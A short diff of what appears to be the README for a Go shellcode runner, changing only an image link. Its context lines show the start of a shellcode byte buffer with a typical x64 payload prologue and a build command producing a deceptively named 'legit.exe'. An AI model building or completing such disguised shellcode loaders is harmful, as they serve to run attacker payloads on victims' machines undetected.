@@ -20,7 +20,7 @@ var buf = []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x4
 go build -buildmode=c-shared -o legit.exe runnner.go
 ```
 
-![image](https://user-images.githubusercontent.com/75935486/154820426-5515ab80-7e17-4ec1-916f-1a55a84a98a6.png)
+![image](https://user-images.githubusercontent.com/75935486/154823436-3aaa8ddb-ea39-41e9-a584-60bfd00e5760.png)
 
 **Code:**
 ```go
